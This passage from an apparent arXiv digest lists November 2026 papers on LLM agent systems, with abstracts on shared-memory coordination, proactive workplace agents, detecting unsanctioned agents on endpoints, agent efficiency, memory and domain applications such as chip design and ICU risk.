  I introduce teamknitt, a framework and open reference implementation in which a user configures a team of 1-16 AI agents for task completion, solution generation, achieving a goal or a research mission; selects one of fourteen deterministic routing topologies or a custom directed graph; chooses a sharing profile that limits what may travel along permitted routes; and binds sources, representations, work dependencies, handoffs and an expertise directory. The recorded process can be observed through non-system views (member reports and behavior) and system views (distributed problem-solving, differentiated transactive memory, interactive coordination, team dynamics). Interventions are explicit and human-led: reviewed reconfiguration between runs, planned disturbances, and private feedback, pause, resume or stop applied at dependency-wave boundaries, with "queued", "applied", "assembled", "understood" and "improved" kept as separate claims. Emergent states such as trust and shared understanding are declared unmeasured.
  This is an idea and system-description paper with falsifiable hypotheses on topology, information flow and intervention timing, including whether the fractal scaling of communication output between members, and between members on different models, relates to task and team performance. No comparative result is reported.

</details>


### 136. Unprompted coordination through shared memory in LLM agents: a locked two-implementation replication and extension

- **Authors:** Pekka Abrahamsson, Muhammad Waseem, Esa Karjalainen, Petrus Jussila, Henri Hansen, Jussi Rasku, Bilhanan Silverajan, Kai-Kristian Kemell
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12412v1](http://arxiv.org/abs/2611.12412v1)
- **PDF:** [https://arxiv.org/pdf/2611.12412v1](https://arxiv.org/pdf/2611.12412v1)
- **Categories:** cs.MA, cs.CL, cs.SE


> Summary unavailable.


<details>
<summary>Abstract</summary>

Coordination between large language-model agents has become a central question for AI safety and software engineering, as such agents are deployed in groups that share infrastructure. Existing research tells the agents that partners exist or asks them to coordinate. Whether coordination arises through shared state alone, with nothing disclosing that anyone else is present, is the key question for deployments that share caches and memory between agents, yet it has rarely been examined, and never with independent replication; this study does both. Four agents each received a short arithmetic task and a key-value store presented to each as its own scratch space; two held complementary halves of one computation, and no prompt mentioned other agents, sharing or collaboration. For reliability, the environment was rebuilt independently from a written protocol, and both implementations ran under hashed locks on design, data and analysis. The results bear novelty value in three respects. Joint success occurred only through the shared store. Whether a model coordinated depended not on its vendor tier but on whether it wrote its intermediate result and looked at the store again, and one ordinary sentence, "check your workspace again before submitting", switched that second look on and off. The findings held under replication. For practice, state shared between agents is a communication channel and should be separated, namespaced and logged. For research, designs should be locked before the data, and the parse rule, endpoint and parameters reported. Future work should test open-weight models and separate using another agent's output from intending to communicate.

</details>


### 137. AutoBuddy: Evaluating Proactive, Always-On Agents on Task Discovery and Execution in a Simulated Workplace

- **Authors:** Shiqi Chen, Daniel Madrigal Diaz, Wei-Ning Chen, Gbola Afonja, Fangkai Yang, Rujia Wang, Chetan Bansal, Victor Rühle, Saravan Rajmohan, Dongge Han
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12393v1](http://arxiv.org/abs/2611.12393v1)
- **PDF:** [https://arxiv.org/pdf/2611.12393v1](https://arxiv.org/pdf/2611.12393v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

As LLM agents become more autonomous, they are increasingly expected to run as always-on assistants on a user's behalf, identifying work to be done and completing it without being asked. Yet existing benchmarks usually give the agent its task, whereas in knowledge work the requests sit in the user's workspace and the agent must first recognise which obligations exist. We study proactive task discovery and execution, in which an agent must infer a user's pending tasks from their workspace and complete them in the systems where the work lives. This setting poses two challenges. For the agent, the tasks are buried in a large volume of mail, chat, documents and records. For evaluation, a benchmark needs a simulated organisation whose people, events and documents are mutually consistent, so that tasks arise realistically and their correct outcomes are known. We introduce AutoBuddy-Bench, a simulator that addresses these challenges. It models an organisation's employees, projects, business systems and event history as a temporal graph, renders it into realistic workspace artefacts, derives ground-truth tasks from the events that create obligations, and computes each task's outcome from the world state; execution is judged by the agent's changes to the workspace. To evaluate current LLMs, we build AutoBuddy, a reference agent with interchangeable backbone LLMs: it identifies tasks from the workspace, grounding each in its source records, and executes each in a separate session with write access. Varying only the backbone, we find a systematic shift in where tasks are lost: weaker models fail mainly at discovery, intermediate models identify tasks but often stop short of carrying them out, and the strongest models fail mainly during execution, most often on business-system operations. Discovery precision is only weakly related to execution quality, suggesting the two are distinct capabilities.

</details>


### 138. Detecting Shadow AI: Unsanctioned LLM Agents on Enterprise Endpoints: A Taxonomy, an Open Detector and a Controlled Evaluation

- **Authors:** Jeremy Canale, Fabien Soulis
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12377v1](http://arxiv.org/abs/2611.12377v1)
- **PDF:** [https://arxiv.org/pdf/2611.12377v1](https://arxiv.org/pdf/2611.12377v1)
- **Categories:** cs.AI, cs.CR


> Summary unavailable.


<details>
<summary>Abstract</summary>

Shadow IT, the use of technology that the IT organisation has not approved, is a long-standing governance problem. We argue that autonomous AI agents can make it grow much faster: agents make building tools nearly free, act with their user's privileges, and leave behind scripts, automations and MCP servers that are themselves unsanctioned. A simple compounding model shows that, under its assumptions, shadow IT grows exponentially once agentic artifacts reproduce faster than the organisation retires them; retiring them starts with detecting them. We then ask whether unsanctioned agents can be detected on Windows endpoints. We propose a taxonomy of nine classes of agents and six layers of endpoint footprint, and argue that rules based only on the structure of processes and connections cannot separate an agent from its behavioural twin, the same program talking to a non-AI service. We present Agent Detector, an open-source Windows detector that anchors behaviour to the identity of the remote service and correlates it with configuration, installation and execution history, using a catalog of 39 tools and 184 LLM endpoint entries; it informs users through a notice they must acknowledge instead of blocking. On a controlled bench of 12 synthetic agents, 3 AI components and 9 benign workloads, repeated 5 times on one workstation, two behavioural rules flagged every behavioural twin, while Agent Detector flagged none and detected every agent in the majority of runs. Its limits are temporal: a connection to a provider behind a shared content-delivery network is attributable only while the DNS cache holds the provider's name, one to five minutes, and an intermittent agent was seen by about one scan in three. A scan costs about 154 ms. The bench is too small to rank detectors; it maps what each kind of evidence can see: unsanctioned agents can be partly detected, and not by behaviour alone.

</details>


### 139. A Modular Perspective for Modeling MARL Systems

- **Authors:** Tiziano Maisonhaute, Jean-Christophe Soulié, Fabien Michel
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12314v1](http://arxiv.org/abs/2611.12314v1)
- **PDF:** [https://arxiv.org/pdf/2611.12314v1](https://arxiv.org/pdf/2611.12314v1)
- **Categories:** cs.LG, cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

The growing complexity of Multi-Agent Reinforcement Learning (MARL) has fragmented the literature, obscuring underlying architectural choices behind diverse implementations. This fragmentation makes it difficult to evaluate critical modeling dimensions in isolation, identify how components affect the resulting system dynamics, and compare, reuse, or combine contributions across the literature.
  This paper proposes a modular perspective for modeling, analyzing, and implementing MARL systems. We decompose them into eight functional modules: agents, environments, learning, reward modeling, training and execution modes, communication, modeling of other agents, and evaluation criteria. For each module, we clarify its role and review representative approaches.
  We instantiate this decomposition in MARLKIT, a framework whose modules are explicit and interchangeable. MARLKIT demonstrates how the proposed perspective supports transparent experimental assumptions and the controlled variation and combination of MARL mechanisms. Experiments illustrate its ability to prototype, compare, reuse and combine modules while making differences between configurations explicit.
  Overall, the paper provides a structured perspective on MARL modeling and implementation, offering a common language for making modeling choices explicit, supporting clearer descriptions of MARL approaches, and supporting more controlled experimentation through the systematic isolation and combination of MARL mechanisms.

</details>


### 140. Trust, but verify, audit and attribute: a human-in-the-loop framework for checking AI-produced research results

- **Authors:** György Eigner, Patrik P. Süli, Roland Hollós
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13042v1](http://arxiv.org/abs/2611.13042v1)
- **PDF:** [https://arxiv.org/pdf/2611.13042v1](https://arxiv.org/pdf/2611.13042v1)
- **Categories:** cs.AI, cs.CY, cs.HC, cs.LO


> Summary unavailable.


<details>
<summary>Abstract</summary>

Artificial intelligence (AI) systems now produce research results in bulk: in October 2026 a single laboratory released more than 700 AI-generated mathematics manuscripts, only part of them with machine-checked proofs. Such volumes will be checked mostly by AI agents that call specialised software. A passing check certifies only the artefact that was checked. For proofs translated into the proof assistant Lean, it has been shown that this artefact may state something other than the author's text, and that deciding whether a translation is faithful is undecidable in general. The human researcher therefore stays in the loop, and human and AI contributions must be recorded. We propose a domain-independent, human-in-the-loop framework for checking AI-produced results. Validated, agent-usable tools with different grounds of trust check the results; a fidelity audit asks whether each check addressed the claim as stated; the human decides at fixed points; and a dialog report attributes the work to the human and to the AI. We describe two automatic implementations of the tool layer, for mathematics (Wolfram Language, MATLAB, Lean) and statistics (Python and R), and run the mathematical one on a two-claim example. An ambiguous claim was split into two readings, one refuted and one proved.

</details>


### 141. Agent4Crypto: A Dual-Reflective and Market-Feedback-Aligned LLM-Based Multi-Agent System for Cryptocurrency Trading

- **Authors:** Guangyan Gan, Jiahao Li, Jiashun Wang, Lin William Cong
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12269v1](http://arxiv.org/abs/2611.12269v1)
- **PDF:** [https://arxiv.org/pdf/2611.12269v1](https://arxiv.org/pdf/2611.12269v1)
- **Categories:** cs.MA, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Cryptocurrency markets provide a natural testbed for autonomous AI agents because they are digital-native, high-frequency, and machine-speed environments, yet existing methods often struggle with non-stationary market regimes, opaque decisions, and fixed aggregation rules. In this paper, we propose Agent4Crypto, a dual-reflective and market-feedback-aligned multi-agent system. The framework coordinates specialized agents for data collection, analysis, risk assessment, reflection, and trading, synthesizing heterogeneous signals from prices, indicators, news, and charts in an interpretable decision pipeline. Our central design is a trader-centric decision mechanism: three style-specific trader agents, Aggressive, Neutral, and Conservative, generate candidate actions and natural-language rationales from the same market context, while their influence is learned rather than manually fixed. A PPO-based gating policy dynamically allocates trader weights through a dual-reflective feedback process. One reflection stream evaluates post-trade decision quality from realized portfolio outcomes and distills reusable lessons into a Financial ReasoningBank for retrieval in subsequent trader prompts, while the other estimates trader-level counterfactual contribution, indicating which style has recently aligned better with market movements. The PPO state combines Counterfactual Contribution Memory with market features, previous trader weights, and current trader actions, so trader influence adapts across bull, sideways, and bear regimes. Experiments on BTC, ETH, and XRP show that Agent4Crypto improves total return and Sharpe ratio over traditional strategies, machine learning and reinforcement learning baselines, and existing LLM-based trading systems, demonstrating the value of interpretable trader competition and market-feedback-driven adaptation in volatile cryptocurrency markets.

</details>


### 142. PARIS: A multi-agent LLM framework for end-to-end, PRISMA-guided systematic literature reviews with pre-synthesis corpus quality assessment

- **Authors:** Christophe Cruz, Hussam Ghanem, Samir Jabbar, Ait Kbir, Hocine Cherifi
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12222v1](http://arxiv.org/abs/2611.12222v1)
- **PDF:** [https://arxiv.org/pdf/2611.12222v1](https://arxiv.org/pdf/2611.12222v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Systematic literature reviews (SRs) remain slow and labor-intensive, and most automation tools address single stages of the workflow. We present PARIS (PRISMA Agentic Research Intelligence System), an open-source framework in which a conductor agent running in Claude Code orchestrates 15 specialized large language model (LLM) agents, from scoping a research question to exporting a manuscript draft. Agents are specified declaratively, coordinate exclusively through persisted artifacts that the conductor validates before every transition, and delegate retrieval, bibliometric analysis and scoring to deterministic Python utilities. Three human checkpoints gate study inclusion, corpus adequacy and the synthesis outline. We also introduce QualityScore, a pre-synthesis index that aggregates normalized network, bibliometric, semantic and process sub-scores into a 0-100 grade. Two case studies illustrate both: AI chatbots and university students' learning (388 records, 100 included) and AI-assisted SR methods (131 records, 123 included, QualityScore 69.1 recomputed with a proxy network sub-score). They show end-to-end feasibility across domains and the diagnostic use of QualityScore: in the first run, corpus improvements chosen at the corpus-adequacy checkpoint raised the score from 74.6 to 81.9 and the number of pre-2023 studies from 1 to 19. Audits of both runs exposed failure modes: incomplete retrieval, counts that drifted between agents, unrecorded or delegated checkpoint decisions and a grade that depends on how citation data are handled. PARIS fully supports 8 of the 27 PRISMA 2020 items and partially supports 11. Output quality has so far been judged only by an internal reviewer agent; independent validation against human reviews is the next step.

</details>


### 143. Toward Sustainable Agentic AI: Carbon Tradeoffs Across Iterative Self-Refinement and Tool-Augmented Coding

- **Authors:** Boris Ruf, Adrien de Mailly Nesle, Marcin Detyniecki
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12128v1](http://arxiv.org/abs/2611.12128v1)
- **PDF:** [https://arxiv.org/pdf/2611.12128v1](https://arxiv.org/pdf/2611.12128v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Agentic language model systems can improve performance either by iterating on their own outputs or by using external tools in grounded environments. While these strategies can reduce error rates and substitute for larger models in some settings, their environmental cost remains relatively underexplored. We present two complementary empirical studies that estimate the energy and carbon footprint of agentic AI across settings of increasing complexity. Study~1 evaluates iterative verbal self-refinement: GPT-4.1-mini at $k = 1$--$5$ steps versus a GPT-4.1 single-pass baseline on two MATH benchmark splits. Study~2 evaluates tool-augmented agentic coding: GPT-4.1-mini, Claude Opus~4.6, and GPT-5.3-codex on SWE-bench Lite, where agents operate inside Docker-isolated environments with access to code execution and file editing tools. In Study~1, $k=3$ refinements close a 16-percentage-point accuracy gap to within 1~point, but nearly triple the carbon footprint relative to the cheap single-pass baseline while remaining below the GPT-4.1 single-pass baseline under the current token-based carbon scenario. In Study~2, GPT-5.3-codex achieves the highest resolution rate in this sample (81.2\%), ahead of Claude Opus~4.6 (68.9\%) and GPT-4.1-mini (25.0\%), but resolved-task-normalized efficiency remains mixed: GPT-4.1-mini is lowest on estimated carbon and cost per resolved task, while GPT-5.3-codex delivers substantially higher task success. All carbon estimates cover output-token inference only; prompt tokens, which exceed 99\% of tokens in Study~2, and tool execution are not charged, so the figures are lower bounds on the full agentic footprint.

</details>


### 144. CARE-PO: Controllable Tool-Call Efficiency for LLM Agents

- **Authors:** Xiaoyang Ye, Xiao Yao, Hairui Zhu, Yiying Yang, Bei Gan, Jinliang Lu, Tengjin Weng, Yuan Yao, Wenhao Jiang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12125v2](http://arxiv.org/abs/2611.12125v2)
- **PDF:** [https://arxiv.org/pdf/2611.12125v2](https://arxiv.org/pdf/2611.12125v2)
- **Categories:** cs.LG, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

External tool calls are a major running cost of an LLM agent, while its training objectives align almost exclusively with task completion. In a step-level diagnosis of Qwen3.5 trajectories at two model sizes on GAIA, a long-horizon tool-use benchmark, we find that most contain removable calls, at a similar rate at both sizes. Some methods add an efficiency reward to the objective to reduce the call count, but introduce problems of their own: the anchor they price calls against is computed from the policy's own rollouts (e.g., the group's shortest correct rollout) and so moves with the policy; training can drift toward a collapsed policy that issues no tool call at all, a degeneracy seen in published reports and in our 27B baseline; and a training run delivers a single operating point, so the user cannot trade efficiency against capability. We present CARE-PO (Controllable Anchored Relative Efficiency Policy Optimization) to mitigate these problems. The efficiency reward prices calls against a reference budget anchored to the task's own difficulty and fixed before training. Injecting a successful trajectory from the training data into each online GRPO rollout group and charging for evidence a trajectory never gathers ease the drift toward a collapsed call count. Shaping the cost curve by an effort tag in the prompt yields an efficiency and a capability operating point from a single training run. On GAIA, five of the six operating points across three model sizes improve on their base model in success rate and call count at once. On four held-out multi-hop benchmarks the result is size-dependent: at 27B and 4B success rate is held or raised at a lower call count, while at 9B both operating points trade success rate for fewer calls. The call count remains well above zero throughout training at all three sizes.

</details>


### 145. System Optimizations for Cost-Efficient Agent Harnesses

- **Authors:** Jongseok Park, Jiaxiang Yu, Eric Zhou, Tony Hong, Sunga Kim, Yusuf Afifi, Ian Wong, Ion Stoica, Alvin Cheung
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12122v1](http://arxiv.org/abs/2611.12122v1)
- **PDF:** [https://arxiv.org/pdf/2611.12122v1](https://arxiv.org/pdf/2611.12122v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI agent harnesses play the critical role of providing LLMs with an interface to a computing environment. Recent studies show that AI agents' task-execution accuracy depends mostly on the LLM used, while harness-side variances such as system prompts or tools have minimal impact. Rather, such harness-side variances show a larger impact on the cost of agent executions, achieving cost reductions up to 2.6 times on the same model and task. To further explore these harness-side cost optimization opportunities, we analyze the cost accumulation patterns across various agent traces and identify system opportunities to reduce token use and LLM calls without modifying the model or affecting task accuracy. Based on this analysis, we design Agency, a harness interposition platform that provides a unified abstraction and allows easy and portable implementation of harness-side system optimizations on existing off-the-shelf harnesses such as Claude Code or OpenAI Codex. Using Agency, we implement proof-of-concept optimization techniques based on our analysis and achieve cost reductions up to 35% across various real-world benchmarks on existing harnesses without compromising accuracy.

</details>


### 146. SCALE: Small-Model-First Concept Abstraction with LLM-Guided Experience Internalization

- **Authors:** Hong Su
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12120v1](http://arxiv.org/abs/2611.12120v1)
- **PDF:** [https://arxiv.org/pdf/2611.12120v1](https://arxiv.org/pdf/2611.12120v1)
- **Categories:** cs.AI, cs.RO


> Summary unavailable.


<details>
<summary>Abstract</summary>

Autonomous agents must continually acquire reusable knowledge from experience without relying on costly large language model (LLM) reasoning for every decision. However, existing experience-based approaches often struggle to transform accumulated observations and reasoning into compact knowledge that lightweight models can independently apply. This paper proposes SCALE, a small-model-first framework that integrates selective LLM reasoning, experience-driven concept abstraction, and knowledge internalization. A lightweight model handles routine predictions, while prediction errors and accumulated cross-episode evidence selectively trigger LLM reflection. The LLM analyzes relevant historical experiences, generates positive and negative counterfactual examples, and proposes reusable concept hypotheses. Independently validated concepts are progressively incorporated into hierarchical neural representations, enabling lightweight models to exploit increasingly abstract knowledge. Meanwhile, mastered experiences are excluded from active memory while their original records remain available in a complete archive. Experiments across ten random seeds show that historical recall improves held-out accuracy from 87.11% to 98.28%, hierarchical concept knowledge increases difficult-case accuracy from 55.33% to 66.47%, and abstract archiving reduces active experience records from 6,000 to 1,528.

</details>


### 147. OGDA: Ontology-Grounded Data Agents for Reliable Analysis over Heterogeneous Data Lakes

- **Authors:** Boyi Zhang, Hong Ting Tsang, Yisen Gao, Qiao Xiao, LI Yufei, Haoyu Huang, Zhongwei Xie, Jiaxin Bai, Yangqiu Song
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12114v1](http://arxiv.org/abs/2611.12114v1)
- **PDF:** [https://arxiv.org/pdf/2611.12114v1](https://arxiv.org/pdf/2611.12114v1)
- **Categories:** cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Full-pipeline data analysis over real-world data lakes requires LLM agents to locate and integrate information across large collections of tables with different schemas. Existing data agents follow task-specific exploration, which exhausts the context window in massive lakes. As the context fills, the agent's reasoning degrades, leading it to locate and process incorrect data files. These errors propagate into the final answer. To overcome these limitations, we introduce Ontology-Grounded Data Agent (OGDA), which utilizes a compact ontology to reduce exploration overhead and constrain data processing. OGDA constructs the ontology through agentic hypothesis testing. At each step, a proposer agent induces schemas, concepts, and relations from raw sources, and a verifier checks each proposal against the underlying data. During task execution, the ontology serves as a representation of the data lake for the agent to explore. Every data-processing action is constrained by a task graph, which the agent can extend only after observing the semantic meaning of the data. Across KramaBench and DiscoveryBench with three LLM backbones, OGDA outperforms the strongest baselines by up to 10.82 points. These results suggest that explicitly modeling the data lake is a key step toward reliable end-to-end data agents.

</details>


### 148. CRAFT-AI: Capability and Requirement Alignment for Flexible Manufacturing through Agentic AI

- **Authors:** Kiavash Fathi, Hans Wernher van de Venn
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12092v1](http://arxiv.org/abs/2611.12092v1)
- **PDF:** [https://arxiv.org/pdf/2611.12092v1](https://arxiv.org/pdf/2611.12092v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

One of the fundamental needs for reaching resilient production infrastructure is flexible manufacturing, which requires translating changing production requirements into implementable system configurations. This paper introduces \textbf{CRAFT-AI}, an agentic AI approach combining natural language (NL) requirement interpretation, Asset Administration Shell (AAS)-based capability descriptions, and reusable engineering knowledge from existing manufacturing configurations. A tool-using AI agent matches requirements with available capabilities and reference implementations to generate manufacturing scenes and corresponding AAS instances. The approach is demonstrated using a Factory I/O prototype with twelve reference scenes and five illustrative manufacturing tasks of varying complexity, providing an initial feasibility assessment of the proposed AAS-enabled, system-level generative engineering approach. For the four valid user task descriptions, proper requirements, correct references to the relevant engineering knowledge, correct components and lastly a valid Factory I/O scene are generated. For the task with missing engineering knowledge and a wrong sensor selection, the user is informed about which requirements of the scene generation lack domain knowledge and also which sensor is not compatible with the selected raw material by the user with link to the related documentation. After fixing the task description, the correct scene is seamlessly generated. \textbf{CRAFT-AI} highlights the importance of safeguards for risk perception and communication in foundation model-driven solutions.

</details>


### 149. Correct First, Fast Second: What a Local 7B Code Model Can and Cannot Do for GPU Kernel Optimization

- **Authors:** Jui-Chien Tsou, Po-Yi Wu
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12079v2](http://arxiv.org/abs/2611.12079v2)
- **PDF:** [https://arxiv.org/pdf/2611.12079v2](https://arxiv.org/pdf/2611.12079v2)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

We study how much the interaction strategy around a fixed, locally hosted 7B-parameter code model (Qwen2.5-Coder-7B-Instruct) affects its ability to replace PyTorch operators with custom CUDA kernels. On 30 KernelBench tasks (levels 1-3, first 10 each, evaluated on a V100), we compare four regimes of increasing structure: zero-shot prompting, profiling-guided prompting, iterative refinement on execution feedback, and a multi-agent loop (analysis, retrieval, generation, evaluation, feedback triage) in which the same model fills four roles around a non-LLM evaluator. Three findings stand out. (1) Correctness, not speed, is the binding constraint: even correct generated kernels average 0.97-0.99x the speed of eager PyTorch, because a 7B model cannot out-write cuBLAS/cuDNN on dense GEMM and convolution; the only real wins are fused memory-bound epilogues. (2) The best strategy depends on difficulty: profiling-guided prompting is strongest overall (43% correct, 27% faster than baseline), but the agent loop is the only method that solves any level-2 fusion problem (3/10 vs. 0/10 for all others). (3) Naive agentic scaffolding is actively harmful: our first agent scored 3% correct, below zero-shot's 30%, and the decisive repairs were matching the agent's ambition to the model's competence and spending compute on best-of-n sampling under a real execution oracle (3% to 33% correct from n=1 to n=8), not on more reasoning steps.

</details>


### 150. MIRIX-2.0: Multi-Agent Memory System

- **Authors:** Wei-Chieh Huang, Weizhi Zhang, Jiayan Nan, Peng Xia, Yu Wang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12068v1](http://arxiv.org/abs/2611.12068v1)
- **PDF:** [https://arxiv.org/pdf/2611.12068v1](https://arxiv.org/pdf/2611.12068v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Long-term memory lets LLM agents personalize, stay consistent, and reuse what worked before. Parametric memories need training, consolidation can lose details for good, and keeping every record leaves a growing store to search. We present MIRIX-2.0, a multi-agent memory system designed to be practical, accurate, and efficient at once. It is the most accurate of the compared systems on four of five QA benchmarks. It reaches 91.4% on LoCoMo and 72.6% on LongMemEval-S, where it leads the strongest baseline by 14.3 points, and with AutoDream disabled it gains 31.0 and 22.0 points over HyperMem on single-hop and multi-hop document QA. As procedural memory, it yields the highest mean success among the compared memory methods on ALFWorld and WebShop and reaches 49.2% on MetaClaw-Bench, against 44.0% for MetaClaw's skill library. Six typed memory agents keep complete records as the system of record, and a provenance hypergraph indexes episodic and semantic records with n-ary frames that cite their rows. Retrieval runs under explicit budgets, so the evidence a question inspects does not grow with the history. AutoDream merges duplicate anchors outside the write path without rewriting any record, and it distills task sessions into skills. With AutoDream disabled, MIRIX-2.0 answers faster than HyperMem on all five timed benchmarks. It needs no fine-tuning, runs with closed and open models, and its code is public.

</details>


### 151. Evaluating AI Agents for Industrial-Level Chip Floorplanning: A Framework and Empirical Study

- **Authors:** Nova-Silicon Team
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12048v2](http://arxiv.org/abs/2611.12048v2)
- **PDF:** [https://arxiv.org/pdf/2611.12048v2](https://arxiv.org/pdf/2611.12048v2)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Floorplanning is an early step in turning a logical circuit into a physical chip: it positions large circuit modules and constrains the space available for subsequent logic placement and wiring. These decisions affect congestion and timing, but their physical consequences emerge through downstream implementation. For AI agents, the task requires translating engineering constraints into spatial decisions whose quality cannot be judged by successful tool execution alone. We present an evaluation framework that connects submitted layouts to a prescribed downstream implementation flow, checks geometric validity, measures physical quality, and reports resource use. On one industrial design whose 99 macros occupy approximately 71\% of a fixed L-shaped layout region, we compare our specialized system Nova-SI with general-purpose engineering agents and agents restricted to file access, obtaining complete physical measurements for 39 layout outputs. Under our 0--100 composite quality score, Nova-SI achieves a mean of 57.97 without online feedback from the prescribed power-grid and placement evaluation, compared with 31.17 for the strongest measured general-purpose configuration, GPT-6 Astra. The difference is supported by raw congestion and timing measurements and persists across scoring-sensitivity checks. Layout-level analysis further shows that similar global utilization can conceal substantially different local congestion. Together, the protocol and case study assess agents through the physical consequences of their delivered layouts and provide evidence about system performance on this industrial instance.

</details>


### 152. Benchmarking language models and agents for scientific reasoning in evolving materials laboratories

- **Authors:** Xuyu Dong, Yixuan Li, Jianguo Huang, Feng Chen, Yiyun Zhou, Bo An, Zheng Liu, Da Shu
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12014v1](http://arxiv.org/abs/2611.12014v1)
- **PDF:** [https://arxiv.org/pdf/2611.12014v1](https://arxiv.org/pdf/2611.12014v1)
- **Categories:** cs.AI, cond-mat.mtrl-sci, cs.CE, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large language models and the multi-agent systems built around them could accelerate materials discovery by connecting scientific knowledge with experimental decisions. Existing benchmarks establish capabilities in domain knowledge, multimodal interpretation and scientific tool use. As language models increasingly support materials research workflows, their ability to distinguish closely related material states and reason accurately with quantitative evidence remains insufficiently evaluated. These abilities are essential for comparing material responses, assessing mechanisms and maintaining reliable judgements as experimental evidence accumulates. We introduce MatScope to evaluate three connected capabilities. M1 tests unaided, condition-specific reasoning through 200 tasks spanning ten research functions, using aluminium and high-entropy alloys as representative material systems. M2 tests agent-assisted transfer of related knowledge to unresolved materials questions. MatEvoBench-20 tests initial forecasts across scientific dependency chains and revisions of still-hidden responses as observations accumulate. Across eleven model deployments, including GPT-6 Astra and Claude Fable 5.1, given-input calculations and many physical explanations are handled well. Fine-grained response estimates, comparisons between similar states and quantitatively supported choices remain substantially weaker. Related literature improves selected estimates, while condition and baseline mismatches limit transfer. Progressive observations calibrate some downstream responses and destabilize earlier accurate predictions. MatScope establishes measurable targets for developing reliable scientific reasoning in future self-evolving materials laboratories and materials-aware world models.

</details>


### 153. Operation-aware Multimodal Clinical Decision Support System for ICU Discharge Risk Assessment

- **Authors:** Guoqing Zhang, Rafik Hadfi, Takayuki Ito
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.11960v1](http://arxiv.org/abs/2611.11960v1)
- **PDF:** [https://arxiv.org/pdf/2611.11960v1](https://arxiv.org/pdf/2611.11960v1)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Unplanned 30-day intensive care unit (ICU) readmission is a critical benchmark for evaluating healthcare quality. Most predictive models assume readmission risk depends solely on a patient's individual pathophysiological state, ignoring hospital operational context and resource capacity. In practice, discharge decisions are dynamic trade-offs between patient stability and bed turnover pressures. To address this gap, we develop an Operation-aware Multimodal Clinical Decision Support System (CDSS) for ICU discharge risk assessment. The system combines multi-agent collaborative extraction with self-evolving retrieval-augmented generation (RAG) to eliminate template noise from progress notes, while constructing departmental workload indicators alongside admission flow features, continuous vital signs, and sparse medical codes (ICD/DRG). Addressing severe class imbalance (about 10.5% readmissions) and alarm fatigue, we implement data normalization, class reweighting, and decision-threshold calibration. In 20 independent runs across 20,000 ICU stays from MIMIC-III, empirical findings demonstrate that: vital signs alone have limited predictive capacity under real-world class imbalance (PR-AUC of 0.1387 +/- 0.0086); directly concatenating raw text embeddings degrades decision tree performance (XGBoost and LightGBM PR-AUC drop to 0.3893 and 0.4030); whereas an end-to-end multimodal fine-tuning architecture (Transformer E2E FineTune) utilizing layer-wise parameter freezing and differential learning rates reverses text negative transfer, achieving the highest AUROC of 0.8288 +/- 0.0110, PR-AUC of 0.4373 +/- 0.0310, and F1-Score of 0.4757 +/- 0.0196. Operational indicators supply independent risk signals, laying an engineering foundation for high-utility clinical decision support tools.

</details>


### 154. ChipOmni: A General-Purpose AI Agent for Electronic Design Automation

- **Authors:** Pengkun Wang, Rui Mao, Zhe Zhao, Dongting Xie, Haibin Wen, Song Xu, Di Wu, Xu Wang, Zhengyang Zhou, Binwu Wang, Xiaofeng Cao, Yang Wang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13020v1](http://arxiv.org/abs/2611.13020v1)
- **PDF:** [https://arxiv.org/pdf/2611.13020v1](https://arxiv.org/pdf/2611.13020v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

